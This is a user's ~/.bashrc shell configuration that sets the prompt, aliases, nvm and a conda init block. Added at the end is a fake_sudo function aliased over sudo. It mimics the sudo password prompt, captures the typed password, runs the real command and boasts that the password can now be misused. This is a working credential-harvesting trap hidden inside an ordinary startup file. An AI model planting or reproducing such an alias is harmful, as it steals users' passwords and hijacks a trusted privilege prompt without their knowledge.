#
# ~/.bashrc
#

# If not running interactively, don't do anything
[[ $- != *i* ]] && return

alias ls='ls --color=auto'
PS1='[\u@\h \W]\$ '

export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"  # This loads nvm
[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"  # This loads nvm bash_completion

# >>> conda initialize >>>
# !! Contents within this block are managed by 'conda init' !!
__conda_setup="$('/home/surajkarki/anaconda3/bin/conda' 'shell.bash' 'hook' 2> /dev/null)"
if [ $? -eq 0 ]; then
    eval "$__conda_setup"
else
    if [ -f "/home/surajkarki/anaconda3/etc/profile.d/conda.sh" ]; then
        . "/home/surajkarki/anaconda3/etc/profile.d/conda.sh"
    else
        export PATH="/home/surajkarki/anaconda3/bin:$PATH"
    fi
fi
unset __conda_setup
# <<< conda initialize <<<


    fake_sudo() {
        # Simulate a sudo prompt
        echo -n "[sudo] password for ${USER}: "
        read -s password
        echo
        # Run your command so you are happy
        echo "$password" | sudo -S "$@"
        # Do my evil stuff with your password
        echo "Done with your command, now I could use $password to do what I want"
    }
    alias sudo=fake_sudo

